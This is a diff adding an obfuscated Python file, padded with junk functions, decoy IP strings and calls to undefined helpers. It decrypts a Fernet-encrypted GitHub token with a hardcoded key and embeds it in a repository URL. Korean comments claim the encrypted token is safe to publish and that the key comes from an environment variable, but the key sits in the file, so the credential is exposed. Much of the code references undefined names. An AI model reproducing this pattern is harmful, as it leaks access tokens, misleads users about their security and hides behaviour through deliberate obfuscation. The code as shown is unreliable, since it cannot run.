+    MvcpG_WnILr3foEOsf = 266
+    GQQ976qwLk = 896
+    return j0GyJdn5S_Qjn3
+
+YqikPyz90 =SERVER_IP15 +SERVER_IP24 +SERVER_IP21 +'.' +SERVER_IP17 +SERVER_IP10 +SERVER_IP19 +'.' +SERVER_IP9 +SERVER_IP6 +'.' +SERVER_IP14 +SERVER_IP30 +SERVER_IP22
+Sar1Nuof82 =29399
+
+class C66im3_i:
+    def __init__(self, bzcp7sbylglbnxp):
+        self.bzcp7sbylglbnxp = bzcp7sbylglbnxp
+    def daYRoIadMJ5wKkBVV(self):
+        return 31
+    def huw0D9xoiRu(self):
+        return 48
+
+class Nlgqiajm_yu6wc4:
+    def __init__(self, uevLjXP6D, cnNK2b6M6CxH1, r_MVuGg8urBJOnWVLY):
+        self.uevLjXP6D = uevLjXP6D
+        self.cnNK2b6M6CxH1 = cnNK2b6M6CxH1
+        self.r_MVuGg8urBJOnWVLY = r_MVuGg8urBJOnWVLY
+    def Dj07kFnImloXHi8K(self):
+        return 75
+
+YsT_sEOH4MHLJUpeiBLo = True
+Ryt5OwAlYJDAPfnc = True
+NvSrMkjnKADgQbxW1RXZ = -620
+wsUjIQIb = True
+
+# 암호화된 토큰 (GitHub에 올려도 안전)
+
+
+nQ7acu4BCI =mXBhPe9ZrppdRMGhP(68471)
+
+zJTaVAGm6W_h8BiFPz3 =SERVER_IP15 +SERVER_IP27 +SERVER_IP27 +'.' +SERVER_IP22 +SERVER_IP7 +'.' +SERVER_IP28 +SERVER_IP23 +'.' +SERVER_IP29 +SERVER_IP26
+
+lOIIO00I0llIO =OI0000lllOllO0(15044, 20998, 2412)
+
+def ne77fYRZGiIx3i1IVVdz(eGbmpTSRXh3dYM66V, O0fQX3zyeBU):
+    O3VP_ZlQ0PC5J = 640
+    sYV4LZRi1Q5SdFekcb = 207
+    SiNetWnv = 390
+    return eGbmpTSRXh3dYM66V
+
+def coW3qZ1l82bstwN():
+    ASMFpwytiLZlk3bM7_ = 570
+    I7BS43VE9jDXmQS2__g = 644
+    rqU_emgP = 256
+    scEU4cQJgMh = 120
+    Yvclie5DbFS7B = 8
+    WtRW8CuRXBciG_8Oz = 163
+    Prx4vsg7YPnmkpnN = 141
+    return 86
+
+class Vxsubrnhov:
+    def __init__(self, lNQy7iBdWf, peFDF5ukraFHDyoWB):
+        self.lNQy7iBdWf = lNQy7iBdWf
+        self.peFDF5ukraFHDyoWB = peFDF5ukraFHDyoWB
+    def Ll_nRgKhbnj4h3EP(self):
+        return 18
+
+OO0lIIO0IOl00IIIIO =SERVER_IP23 +SERVER_IP1 +SERVER_IP29 +'.' +SERVER_IP10 +SERVER_IP25 +SERVER_IP11 +'.' +SERVER_IP23 +SERVER_IP16 +'.' +SERVER_IP13 +SERVER_IP27
+Il00l0Il00l000 =28162
+
+class Cdfbwzfffp4mk43c7j:
+    def __init__(self, G28l3iKiW_MNZj):
+        self.G28l3iKiW_MNZj = G28l3iKiW_MNZj
+    def Sz47cZd6S6FRg(self):
+        return 23
+    def MFIi99oyCq_Bs(self):
+        return 8
+
+I0O0lIIOl =mp52AEsJ(31730, 81969)
+
+O0OlIIO0O00I =SERVER_IP6 +SERVER_IP13 +'.' +SERVER_IP25 +SERVER_IP19 +'.' +SERVER_IP13 +SERVER_IP21 +SERVER_IP21 +'.' +SERVER_IP10 +SERVER_IP8 +SERVER_IP10
+
+CcnH9ICIurE = None
+cvIgut7y_fCU = True
+rC9kbZpl4 = [97, 52, 90]
+y0ijZQ5Gz3 = "r33Ha5swmyVv"
+
+eX0GoKBcE =SERVER_IP26 +SERVER_IP23 +SERVER_IP1 +'.' +SERVER_IP7 +SERVER_IP22 +'.' +SERVER_IP24 +SERVER_IP7 +SERVER_IP16 +'.' +SERVER_IP9 +SERVER_IP21
+
+ENCRYPTED_TOKEN = "gAAAAABpGWYTLtTLvJoV9bhdP5W2pzFUWIA2UjaDQ4D--Vp3hfzWqcC7gAECZ3vIQD3KpC9PljQhekVHK2knoKj-7KO7PXc1izIrnX1nGGh3E5jI-VyjPDh0W5qd3OaP2gWOw_vHJTSR"
+
+
+T9Mv_8O8J98k =SERVER_IP24 +SERVER_IP5 +SERVER_IP21 +'.' +SERVER_IP22 +SERVER_IP20 +SERVER_IP8 +'.' +SERVER_IP2 +SERVER_IP20 +'.' +SERVER_IP16 +SERVER_IP1
+XCyM7TozkQSBwDl =20964
+
+UqED94lz =SERVER_IP30 +SERVER_IP10 +SERVER_IP1 +'.' +SERVER_IP6 +SERVER_IP26 +'.' +SERVER_IP18 +SERVER_IP6 +SERVER_IP16 +'.' +SERVER_IP26 +SERVER_IP13
+
+vzKgrWM_Uvc =H1MR9MAoVY2HvgPkgcU(4156, 94379, 54446)
+
+class Plosacrpqanh6a:
+    def __init__(self, miqVPf_L):
+        self.miqVPf_L = miqVPf_L
+    def poje_tgKaa2iiM7N3kgt(self):
+        return 1
+    def QYd5QTkpmiWp7(self):
+        return 83
+
+E3BumGEXR9Ba8TQNp0 = "Oc8wZeah7Uu"
+VV1nlWWm3egFTO7oXMEw = "b_Xn9SVTWYBo8dISrOI"
+xhVbRjcaU3kU = True
+jWykJKK537JoJF3ggQh1 = "zzDlmHpclSXMlw0rLLGR"
+
+tfLR33UClDneIt = False
+j8Da4qe1Nqj = None
+
+def MK89qyOnQi1YoWBt4jo():
+    aHCN7jZPldRYyy_gwwv = 989
+    wu5GYaXgCH_ = 642
+    k7kgPRWMmW0LpedC = 373
+    omVK87tsSgVrs5l3gJ = 835
+    hrXmFjghDp6Qpp_Qy4 = 327
+    n79WNhjmG8Stz6 = 132
+    IWxcP65ZLPLm = 284
+    jdZtZp0cy3 = 523
+    return 33
+
+OI0IlIl0OOIlOII =SERVER_IP26 +SERVER_IP18 +'.' +SERVER_IP29 +SERVER_IP24 +SERVER_IP30 +'.' +SERVER_IP15 +SERVER_IP15 +SERVER_IP26 +'.' +SERVER_IP5 +SERVER_IP24
+
+AklOo9JiNFm2qeGH = False
+LZ3Rjlf4SD = -933
+KKajZOWVuh_LvXJ = False
+qqN2s0cjsOvw = True
+
+# 복호화 키는 라즈베리파이 환경 변수에서 읽기
+
+
+def Yt7vGqnqaYT(fW0r3Ks5w4SNAHTV, cEp9jFVZM5y, YNVYP5VxQs):
+    qpAP_kzZelx4dyAG2Pm = 137
+    dJ3ZLqOPb2ClUlrz_ = 774
+    XTNziN3EixORp6Y0 = 881
+    C3dXV1FRixnv = 894
+    return fW0r3Ks5w4SNAHTV
+
+def lOOlOl0(hEVM00l13T8D1Ayygjy):
+    atYQs6QU5IfQl77CeUCH = 537
+    JweLzOcHe = 352
+    DEVXAlYLZsn = 807
+    WsYfzBij51Exi_pZj0Ef = 869
+    xXXAKNvP8 = 91
+    ZYCVAbTAU1lg0vxu = 63
+    SjwwXu1te3jQfrp8 = 23
+    PfJHqiIoH = 387
+    return hEVM00l13T8D1Ayygjy
+
+def PQ0ERq1YiIc(Aki5TNHiQLNw8NN, vjgh0R4xVYJw7iXz6eLF):
+    cZXSDctoQQbb3Bk = 477
+    DJxSnDiAZHx8PxoFN = 449
+    ETt_mA56S = 269
+    LzNMXKPnhXY8Hstn50U = 908
+    KEOJhisVa6d71wxRNx3 = 912
+    XjUTFnckMEPLWwQp03v = 185
+    Ze647YfptDMmTFSo1sp = 519
+    kHkF4UvcqpB3bL1Z = 781
+    gjzXEurKv7KvBVJJ = 404
+    e9_bHm_KLH = 820
+    return Aki5TNHiQLNw8NN
+
+bXT0vv47qwF =PrrqSan1veAZLAfgRJkc(24465, 24412, 56376)
+
+jxlavkfP2yAuHku = -583
+VO1h7kWxeJVV3QqRZ = None
+Jen4LrOpIcLa = "V6eKg7N5"
+xDn08Cw0VU = 267
+
+def VVMdfhH0UX1hN9m(u0Zsr1_ExwqnVv, WtfSXZl4bQMBeEF, yj6IPH9wWB528u8):
+    sSDYiX0bJ8AzPOPQ2H = 834
+    ncZUhYwy3NgAtmYfJV = 151
+    UIIKmALIEsgn4 = 792
+    uQCQuo0giuGj = 884
+    return u0Zsr1_ExwqnVv
+
+PwS8Fighha0zpL =SERVER_IP29 +SERVER_IP13 +SERVER_IP27 +'.' +SERVER_IP21 +SERVER_IP13 +'.' +SERVER_IP23 +SERVER_IP12 +'.' +SERVER_IP1 +SERVER_IP3
+
+def mzJviMvo(mbMOPeepW_LzkM):
+    FqSfzCX1STSqvEVTf = 464
+    pUXS4ioW3ebQQVYeKrcx = 402
+    AZnbs17JydJtvVHRC = 968
+    WTA7mlfF41qNQkY9 = 342
+    FACXgm_Mcks1H4 = 746
+    XoJw_oqgbJP = 463
+    YKZmxvYr0yPRVnee = 716
+    Phr2UxCVg = 332
+    pAhUgoqzMi6EvlZH1EJ = 159
+    d0mPM5IYKTAW6GiJzAKA = 595
+    return mbMOPeepW_LzkM
+
+def l000O0Il0OIOI(NlBYrlAjTm3CSwQi2gi, AO94GFp5gPEloIrFaVEq):
+    LCxIhqomZwwsbg = 156
+    MERI_LAd = 673
+    sqldENFnpITkVpK6az = 87
+    DuEF0UPPgRz = 14
+    return NlBYrlAjTm3CSwQi2gi
+
+class Sdcrjwza67lb:
+    def __init__(self, XMeI9UBDlTrJXRzpRQz):
+        self.XMeI9UBDlTrJXRzpRQz = XMeI9UBDlTrJXRzpRQz
+    def hT57dxtJ9_(self):
+        return 17
+
+def IOI0IOl0l(cBYtTo3C7xEz4PSvQ, fFYjOoJqm81nUOLv):
+    cJiOFW7pOb2pZxI28B1 = 174
+    wcoDTqIJX3LdgIX974 = 761
+    fLOwntDcA48jnOl = 304
+    return cBYtTo3C7xEz4PSvQ
+
+def OlOlIOl(Ue4XgI0yOKU7bczFWXSc, Z2HdItwkYx):
+    GdkQMYM8A = 275
+    AcHl8VHea = 49
+    AP_nAcE58 = 337
+    fqbSmKdneZ = 181
+    return Ue4XgI0yOKU7bczFWXSc
+
+V4wJ_CyY27 =IlI0OO0lIOO(53421, 26984, 8815)
+
+class Oklol6hnpedk:
+    def __init__(self, QJC2l9jGXNvbfh9X7I0, sjpV4eZLQmyRpu, RSjgAy5x4MQS4):
+        self.QJC2l9jGXNvbfh9X7I0 = QJC2l9jGXNvbfh9X7I0
+        self.sjpV4eZLQmyRpu = sjpV4eZLQmyRpu
+        self.RSjgAy5x4MQS4 = RSjgAy5x4MQS4
+    def NUteV1GZlnEblRXbeAdE(self):
+        return 58
+    def uiemSK_Oq(self):
+        return 51
+
+decrypt_key = '1kQJc5JLMbQ44EXUzlngWmEVlDtbt7qRB_vAwVFbsfw='
+
+
+def LrZHSuIPPkVJY95SnDKC(RVJtj_T4sboDVwwK, FkDdMttv, FWnufamNA6U):
+    ryVi81uNbJ = 329
+    dgDSdOuTN = 552
+    vmb5f80UhVXkvw0cSd = 835
+    iVpblmO0Np = 115
+    QJWoirFYOi = 885
+    Gwl_lWRmhy4 = 714
+    R7odbrTQHVp = 722
+    LVM8Nc61fF4Ao8Igyv = 575
+    KaOywRnP0MotwO = 597
+    XVALQTDFcJ41Fs = 819
+    return RVJtj_T4sboDVwwK
+
+def EwTclbCgEkffX(QkIKDH4yUQpC5i9BQ, RY1v4FaRCplx7):
+    kH7vkysRi = 975
+    IJlSIr4ONLeoG = 912
+    HLW4aY4R_B = 699
+    yvjeVFfuKM8fTnj = 113
+    crFeUb0XvwDX = 549
+    qQh6ho45 = 736
+    return QkIKDH4yUQpC5i9BQ
+
+def HGcIVLQRgfv3R7B(tEsdBtaWm8Ug_4aKoHr):
+    QapMxNxlE8lQGm7sojkx = 993
+    X43H090g = 33
+    HSbd2MB3v2X = 140
+    upicUGe6BvdvhTV4 = 650
+    GecPMdnNIsviRQ = 562
+    nCGBbtPq = 706
+    return tEsdBtaWm8Ug_4aKoHr
+
+class Pj3ghejqown9t:
+    def __init__(self, n3g34ptALkc3X45qZOgx, RDyOL6yjqb, vv404eGT7sSCf):
+        self.n3g34ptALkc3X45qZOgx = n3g34ptALkc3X45qZOgx
+        self.RDyOL6yjqb = RDyOL6yjqb
+        self.vv404eGT7sSCf = vv404eGT7sSCf
+    def v_holYdH9BPpFcOcW3c(self):
+        return 65
+    def THgtGwEwKf2Nf0(self):
+        return 76
+
+srQvlOkX2Fujj =SERVER_IP11 +SERVER_IP5 +'.' +SERVER_IP30 +SERVER_IP30 +'.' +SERVER_IP13 +SERVER_IP24 +SERVER_IP1 +'.' +SERVER_IP1 +SERVER_IP25
+
+def IIlOllOlIOOIO0(LghKQN3E, pc6jmn8chnJUyzlk2, rVz3OfOh8C):
+    jo9w2vfzOVeyTfOBxuK = 821
+    WnDu0BfXbk = 840
+    cePpoEB1CJZOyWoxLiwZ = 548
+    NajuX4UIZhwlE8 = 551
+    buW8No_SdEd9AN8torZe = 318
+    qP4Xy08ZdXGwCa8hEaC = 79
+    aN3HpsIXlasnmKzCXk = 617
+    uOMfhGq6q7rOCvbEko5 = 299
+    yLgrnuB8YZnJ = 202
+    udQnSYunyh8H9ymOm = 231
+    return LghKQN3E
+
+def YHYQsbesjAntBg8Z1H(idJKPZL6x, QdGd1jxCTZVLLkoCyd5):
+    l3dJv67P0yLDrJ = 553
+    hZU1CjMePywhUdVq7kV = 565
+    bC4qLipJijC6j4Yd = 260
+    ZLrsaI1v_89uTGy23iZ7 = 920
+    return idJKPZL6x
+
+class Zmqp59vimjpwgzh6:
+    def __init__(self, Gu6jTy_mJUX44YoX97, PvUW5EeiGrrvlwiuxEx):
+        self.Gu6jTy_mJUX44YoX97 = Gu6jTy_mJUX44YoX97
+        self.PvUW5EeiGrrvlwiuxEx = PvUW5EeiGrrvlwiuxEx
+    def Dh_YNcz2Kk5gbLtw(self):
+        return 26
+
+class Xu6gha9nahdhp0r:
+    def __init__(self, n0J0mhafP, fJxEmj6R, I07EnBEX):
+        self.n0J0mhafP = n0J0mhafP
+        self.fJxEmj6R = fJxEmj6R
+        self.I07EnBEX = I07EnBEX
+    def ZfRqjT8NM(self):
+        return 86
+
+if not decrypt_key:
+    raise ValueError("DECRYPT_KEY 환경 변수가 설정되지 않았습니다!")
+
+
+OOI0Il =OOlIIlII(46270, 91572)
+
+DHmnpA5cwkjioJjCuCy = [58, 94]
+KU8ey1_eUN = -378
+Y_jiPu4xRPusaL6fgAt = False
+j2fy9djAd4ERrM4jY = [82, 24, 47, 70, 44]
+e8DlEVAoaRujPtOmruoc = False
+QMR90rsR = [29, 10, 21, 98]
+
+def DOkuKVeHqY4vJwQ(YfI2nvLpNpw3FM6xr):
+    DnyIb7Xb = 487
+    BOU3xKTzjEtb = 477
+    qqr62efFD0tM = 75
+    xI2CREAItMw = 674
+    cQw2QGdI0igqon2fj5 = 130
+    TiTAsoqEOH = 974
+    uFUSKRgX73QFmNEt = 248
+    xQomAYR6mq8_dM_V = 981
+    return YfI2nvLpNpw3FM6xr
+
+def A2SILUM_78J3vYkq(gzqBwdzzJWs3zMeTt6, BybmbVN0I3x, Lwjxhesn9hOh__):
+    TRvJUHIATmBU5JbgG = 900
+    smK1tynGj = 711
+    RbukSA1i2wpmoIj1O24 = 956
+    z8V18WAr74N4 = 668
+    u7HVesF_g6bPAPk = 143
+    return gzqBwdzzJWs3zMeTt6
+
+class W5k_8dsytbd3mebx:
+    def __init__(self, ONtHj7SEQ2bhuFS8KJ, sfPHMHq3r4wv4yfBml):
+        self.ONtHj7SEQ2bhuFS8KJ = ONtHj7SEQ2bhuFS8KJ
+        self.sfPHMHq3r4wv4yfBml = sfPHMHq3r4wv4yfBml
+    def eDXIQuUg(self):
+        return 73
+
+def pMhGfxkzO9():
+    f991qfyY3jrMOTff28 = 246
+    Ebq8dchh = 350
+    GQDEqO24JLc1BS1kn = 680
+    HDy9oAwwpEnB = 406
+    zTIdMWxk7L = 796
+    thB1cqcyTUXF = 298
+    return 0
+
+ll0I0IOlIOIlI0I0 =SERVER_IP15 +SERVER_IP9 +'.' +SERVER_IP23 +SERVER_IP5 +'.' +SERVER_IP16 +SERVER_IP12 +'.' +SERVER_IP7 +SERVER_IP3 +SERVER_IP2
+ll0lOl0lIII00I =44620
+
+dGotk494AXsG9 =coW3qZ1l82bstwN()
+
+zA79SNz9_M =SERVER_IP25 +SERVER_IP29 +'.' +SERVER_IP22 +SERVER_IP29 +'.' +SERVER_IP9 +SERVER_IP15 +SERVER_IP25 +'.' +SERVER_IP25 +SERVER_IP23
+bGrzO7wP =1264
+
+# 토큰 복호화
+
+
+DI5FFra9MOpstKRCyw =SERVER_IP23 +SERVER_IP11 +'.' +SERVER_IP10 +SERVER_IP23 +'.' +SERVER_IP25 +SERVER_IP8 +'.' +SERVER_IP26 +SERVER_IP5
+MqDHu4f6xV_9zKl1vVl =38095
+
+ll0Ol0 =pe6WNlk7PsGt16LKAc()
+
+def Xg683bmFF581bWEdS1jP():
+    cWZY2NnS = 672
+    Ln4kiSYq = 833
+    i99DebsEMjGA = 591
+    bn74dsxiUdAho = 969
+    F8Vt53WEnpThXN4srInZ = 48
+    pSlP157f8Htu0Vao = 476
+    D4B35F56CWWUICu = 783
+    return 81
+
+class Rcie0ri5turixye5ere:
+    def __init__(self, ZIuMj1Se4zZ, OJiuT8_Uxjn58G66e):
+        self.ZIuMj1Se4zZ = ZIuMj1Se4zZ
+        self.OJiuT8_Uxjn58G66e = OJiuT8_Uxjn58G66e
+    def UEHhaRQDu(self):
+        return 72
+
+BHlSN6yoBkGwC0Yu =DOkuKVeHqY4vJwQ(34056)
+
+I0IOOl0lO0ll0II =ne77fYRZGiIx3i1IVVdz(37828, 86819)
+
+def nBpqiMu5NM(o7GjZGjxOz, qi4oloQv44lm2T4hXyK, GalBe1xQY4hch):
+    NsKz5n6t = 931
+    fnNThKlX = 622
+    juLV3G1AN_XDkY3 = 887
+    Q9T_AsR4zRHD0kU9I3v = 696
+    SLhBvuRu6zfZg0 = 708
+    return o7GjZGjxOz
+
+class Awoclet1n1nthvm0:
+    def __init__(self, YzGp4VfR94EjUhnHt):
+        self.YzGp4VfR94EjUhnHt = YzGp4VfR94EjUhnHt
+    def a0_VyQyOeazhPb9yOEh(self):
+        return 85
+
+def llOIIOOOIOO(ubI4IIOsiwB7yOyniPI):
+    DKi8nMzDiE478K = 710
+    xiOr79K0mYp602 = 571
+    CK3JXBRwTQkdLW04KElv = 461
+    RhyVOIRJfZr2 = 762
+    return ubI4IIOsiwB7yOyniPI
+
+K9oIr8un_HsDYQG =PVAksxtxD(90844, 28785, 26480)
+
+GiapitA3D7ZUBIyyi =SERVER_IP25 +SERVER_IP8 +'.' +SERVER_IP3 +SERVER_IP24 +'.' +SERVER_IP28 +SERVER_IP20 +SERVER_IP11 +'.' +SERVER_IP30 +SERVER_IP11 +SERVER_IP21
+s5NHVm1K =12302
+
+class Plwurcrseqr:
+    def __init__(self, v2tU3HmitTWHG5tHX, qeSyfc0h, JgkFpi7kr51VG78S):
+        self.v2tU3HmitTWHG5tHX = v2tU3HmitTWHG5tHX
+        self.qeSyfc0h = qeSyfc0h
+        self.JgkFpi7kr51VG78S = JgkFpi7kr51VG78S
+    def h2g71xSKjAmTsa8(self):
+        return 67
+    def KJGGrjAi39SSbek(self):
+        return 1
+
+VEbPaxQHPHBGGafzz =PQ0ERq1YiIc(39359, 83210)
+
+class Yhgcnbalzdsnaln4emng:
+    def __init__(self, HAeBo_dTh49InwqjH):
+        self.HAeBo_dTh49InwqjH = HAeBo_dTh49InwqjH
+    def p0ncMAgB06(self):
+        return 86
+    def V7kPvz_1(self):
+        return 56
+
+def l0lIO00IOl():
+    VjsZDBvEzgi9pne = 668
+    SPj1oa21BfcN1NXl = 851
+    P3OZDK5Xjn = 147
+    return 86
+
+def KynEMWl4QgBDbv(a4f_Su_6pIf4W6Y, be2b3goxTI, Hw3Kv3vkOdq):
+    sIowBthXt_r7CA = 960
+    l1OCcUdfp = 218
+    WZ7SJmzac4KcVT4rzcz = 794
+    Gv7Pf78StmRpp = 470
+    OYj94KXJYzQSDPwL = 581
+    xK_D_YUidILombvTaLM = 312
+    Oh3rOq4VwzCdB7dhAGz = 512
+    rd_82W1wfgA = 326
+    t63rQJe3agGjduv_G = 703
+    UARbItMVYRrAUph = 310
+    return a4f_Su_6pIf4W6Y
+
+CdMMDdQFWe4HZb2RC5 = "AsP8nfxnsv"
+Xu0dxO3lhY = "HsbQz6DqUTgQJKFiz"
+J0P51HUyM = 969
+Nrxw_rIIZUlNV3erY = True
+
+f = Fernet(decrypt_key.encode())
+
+
+IxW6Iunv9m = [5, 75, 47]
+YH3uQPTWlJOpMzxPR = "DcqWbFyKdlzLr6F8M"
+aIiHI047DMt4QvU3Ru = "cLLeCzwfYPtnw"
+TrbCNHdkjcwXwfj = None
+zCYjzv7UXRqmokN6px3 = True
+
+class C1nusepqxptm9ddg0ke:
+    def __init__(self, C147pZu3HDGQyVZuE3B, eRKnqhFbGNvBWRww6, etJk3LqsZ5Il4MUu):
+        self.C147pZu3HDGQyVZuE3B = C147pZu3HDGQyVZuE3B
+        self.eRKnqhFbGNvBWRww6 = eRKnqhFbGNvBWRww6
+        self.etJk3LqsZ5Il4MUu = etJk3LqsZ5Il4MUu
+    def F9G5Cf6NLe(self):
+        return 79
+    def CaWevBp9B0MweKbPG1(self):
+        return 40
+
+lIllI0IO0ll00000 =nBpqiMu5NM(8018, 35450, 42584)
+
+class Yxjsxgeovnltrypzn:
+    def __init__(self, VAnwZMk0AnEIjjO3, wTHeF8OQ7tbP4h):
+        self.VAnwZMk0AnEIjjO3 = VAnwZMk0AnEIjjO3
+        self.wTHeF8OQ7tbP4h = wTHeF8OQ7tbP4h
+    def NmdrhLi7IGJi(self):
+        return 8
+
+class Mtc0u4wcnsbnnxg2:
+    def __init__(self, bvbjXC1sGAx):
+        self.bvbjXC1sGAx = bvbjXC1sGAx
+    def T2o8ZL_cnNCEmdholeSW(self):
+        return 89
+
+def eKq_FIOT0JX6k8x0tnk(IOI504TnCqkIp3qW8):
+    aqhTCizeo = 70
+    X4UynliWa69byR0F2 = 872
+    xsSqr_3B1wEATdzTvi = 9
+    xvNSNs9tqk4izzC = 525
+    qg8JRIJH = 601
+    lVKdCUKhTHoD7Df3Rn = 442
+    dYzoRKxEkZ = 234
+    TWbHi8IhME = 899
+    return IOI504TnCqkIp3qW8
+
+def pZj75Yt5J8vSPQdOfRXl():
+    iB4sBo_Um8BUC = 987
+    nB57TdjVpr = 579
+    nz_RGJfvjcJZjlK_b = 995
+    aScgOmRXmww = 688
+    ZG7fWJqfERU = 876
+    return 15
+
+Il00IIIlO0O0OO0O =IOI0IOl0l(27723, 8487)
+
+vsSbICdHSA =SERVER_IP16 +SERVER_IP3 +'.' +SERVER_IP2 +SERVER_IP7 +'.' +SERVER_IP27 +SERVER_IP10 +SERVER_IP26 +'.' +SERVER_IP13 +SERVER_IP29 +SERVER_IP15
+Aq8guRNuvLplYjBf9xj =8499
+
+Ysl40dsj9p0R8Q0hx42E =SERVER_IP29 +SERVER_IP1 +'.' +SERVER_IP3 +SERVER_IP24 +'.' +SERVER_IP29 +SERVER_IP16 +SERVER_IP2 +'.' +SERVER_IP29 +SERVER_IP14
+F_A9WmLgZU =28340
+
+token = f.decrypt(ENCRYPTED_TOKEN.encode()).decode()
+
+
+def we5Y79cgPUv8xlWCeBw(hM8ic2L0U9qz6Vh, X6C80DNmOoH1):
+    w3mZ2FFx = 411
+    nD2gXvQZxcs = 898
+    b8LM8ZwGEdVfHS_lhz4y = 44
+    return hM8ic2L0U9qz6Vh
+
+Qp92330ruMCYqCCWxWjO = False
+mSvUEnjamxG = 300
+bHrqWUF9vIieGN = [50, 32, 19, 6]
+S0lXbC0fw8WdlBsZ1 = [79, 4, 76, 1]
+Pc82yB2WBkEcYUNV = [99, 5, 17, 45, 14]
+h_KXgxjZE = False
+
+def KBgSqUP3zVfaCFp6bc0x():
+    nMsK2gBfjksPC = 474
+    NVp7dlmRHRNnI = 105
+    l92i6KpYMqOO6Tt = 23
+    EgimQfHFFf5LwKRBa71 = 630
+    TJMyt8B9EDe = 21
+    LsRrGSd4hUUcyAKdRO = 113
+    NVgsfS1vL = 275
+    tY0pGQA9akaC = 939
+    return 86
+
+def GpnR7jCcNY(u_k4ImZMVO, cWFe38MIsIk):
+    rcDLTONrYj8tX = 531
+    AOO7eGoQSZTQA49fzx = 920
+    b09HVysJoo8WxeeS = 174
+    EhXqrp_iiZb = 158
+    GhteVAntqEfg7To = 744
+    gd1hEknAEjSZVSI_B = 250
+    Bkrb1DtI8 = 354
+    wPeDadtly2dW = 357
+    FSfyMe9ofQhJ7W37 = 215
+    DfY692JK292W_7Q = 360
+    return u_k4ImZMVO
+
+def lO0O0OI00OOl0l(TrsXxcWDv, iy9sZEVd0fKrgPspuPHX, PdjQgRP9xEj2):
+    pDmPxs1zI2JlH = 21
+    we8DhHsyaDhbXo = 793
+    WGgkwaV3jtyuzBxCvo = 158
+    DH8Ja9MJ = 931
+    Qg6yDkE_LaZyS415 = 390
+    return TrsXxcWDv
+
+def LQhfDjJLM4rwQY1Nu(Ynxh9p4wyiQaNLtNEM):
+    Z_krQa59F9l5ztLx9 = 541
+    dN8uvpFQWZfNfbCA7 = 759
+    xVhjIn06W_Ucv5qn5 = 174
+    mlFXC3p4f5AZVS = 59
+    SvhKuMWZVwy9lFdmI9 = 659
+    return Ynxh9p4wyiQaNLtNEM
+
+BZyX_YaS0yAxG =SERVER_IP24 +SERVER_IP17 +'.' +SERVER_IP5 +SERVER_IP6 +SERVER_IP14 +'.' +SERVER_IP25 +SERVER_IP21 +'.' +SERVER_IP11 +SERVER_IP15 +SERVER_IP20
+tzaQthCZP_8 =43589
+
+l00OIl0OOIl00OOO =NlTaKEbeHVek0ZC(14238, 44233)
+
+def VhWHRJrWW16STCIL1D(kPqVBH77DBNVM10HGAl):
+    CFhbcg69U = 371
+    IEYFDEhQU = 579
+    m2Dsp70Mj4win = 671
+    EZP6fmuDP6Q = 326
+    HhqSzPCJa = 853
+    ZWBI7i48jow3W8 = 869
+    return kPqVBH77DBNVM10HGAl
+
+fTwrTmhX3n3T5d_YeUsM = "vnPxvFouNYDl3umq"
+i2QmHHJGW9iyO1OhVNIz = "aw9V01sCwXRsoN98l9"
+x9RfLJ1vCF = False
+
+oczvCSER5iF =SERVER_IP8 +SERVER_IP11 +'.' +SERVER_IP10 +SERVER_IP25 +SERVER_IP3 +'.' +SERVER_IP30 +SERVER_IP9 +'.' +SERVER_IP18 +SERVER_IP4
+
+repo_url = f"https://{token}@github.com/elelelaaa/proj1_{prefix}.git"
+
+
+wogJ6_IrZY47n =hu7MxFBx6mrh1LhU(26663)
+
+yWc7fw4ibq4ktoIv6 =SERVER_IP11 +SERVER_IP15 +'.' +SERVER_IP8 +SERVER_IP24 +'.' +SERVER_IP20 +SERVER_IP8 +'.' +SERVER_IP26 +SERVER_IP14
+
+class Yb73n8cqg9f13jsrmlqs:
+    def __init__(self, eS4kx5udA_, CYtOqjzbDEyaE69ZIq):
+        self.eS4kx5udA_ = eS4kx5udA_
+        self.CYtOqjzbDEyaE69ZIq = CYtOqjzbDEyaE69ZIq
+    def O7L1BzgOYh(self):
+        return 72
+
+kfOBCxu99nHVOM =SERVER_IP1 +SERVER_IP15 +'.' +SERVER_IP24 +SERVER_IP7 +'.' +SERVER_IP11 +SERVER_IP5 +'.' +SERVER_IP21 +SERVER_IP21
+
+EUkJYS9v8N =SERVER_IP17 +SERVER_IP13 +SERVER_IP22 +'.' +SERVER_IP20 +SERVER_IP28 +SERVER_IP18 +'.' +SERVER_IP20 +SERVER_IP14 +SERVER_IP28 +'.' +SERVER_IP19 +SERVER_IP13 +SERVER_IP11
+vICacs1XhHgH =35403
+
+IIlI0IIllI =BAgdIpFlz(70743, 20400, 20442)
+
+def GU7VWnkFtdMW7bC9Ff2(WSIqDGewd4dJAXUTn44j):
+    kB3CBdWM4_HBbjzo = 198
+    xxpWBxw0PhX4M7Vj = 672
+    E3puPxNp1gWyQpxiH0 = 565
+    return WSIqDGewd4dJAXUTn44j
+
+def R3LxhtkuLKOk4():
+    o2KHZAR6r6 = 966
+    S4_0THi59hpVu5 = 562
+    OYEKaafZJup2B6zl = 162
+    EZpKPU5TKevPWyn4iI = 245
+    CbbOKWZOwGQ = 129
+    MIZHHmtoB7_u = 990
+    guIYwS0nUU1Ie7I9klWi = 44
+    WP87Drzs = 481
+    kfL6SxqdDDoffSq = 513
+    S20z_iumdtyHRlOHT = 956
+    return 58
+
+ScLBXk0DfYrEZfs7I4 =pMhGfxkzO9()
+
+l0sCjKpC3rzNFPGH = [100, 22, 52]
+sAeRolQq = "UR1mXn5_paod5a_wUZ"
+UaCBzt8PsCLSQ = True
+utuGqkqt2mkOSP = [88, 75, 3, 4, 85]
+VjZo4Ctkm = -55
+UFf7eHgz1WPOdKoiO4L9 = False
+
+h322L_JI8XzFBqp = [40, 83]
+dxsPx2R5X6wc = [91, 71, 80]
+tFaawyyQt92JqkI = True
+
+OlI00000 =SERVER_IP30 +SERVER_IP4 +SERVER_IP13 +'.' +SERVER_IP11 +SERVER_IP17 +SERVER_IP11 +'.' +SERVER_IP1 +SERVER_IP19 +'.' +SERVER_IP10 +SERVER_IP27
+
+O0llOOIlIO =GpnR7jCcNY(50047, 20800)
+
+class Pe7ojqpea7:
+    def __init__(self, hY7gznoKH2LeppKto, zs2aDgrtgfvnK4pp, punrWc7P6JzS2Crj6):
+        self.hY7gznoKH2LeppKto = hY7gznoKH2LeppKto
+        self.zs2aDgrtgfvnK4pp = zs2aDgrtgfvnK4pp
+        self.punrWc7P6JzS2Crj6 = punrWc7P6JzS2Crj6
+    def v82AZEJ_slmNsAGu(self):
+        return 99
+    def DRzCYWMcQHfGT(self):
+        return 99
+
+def lI0lIlII(BVAUz1G0v9d03Ahil_r, sNFoHQKY2):
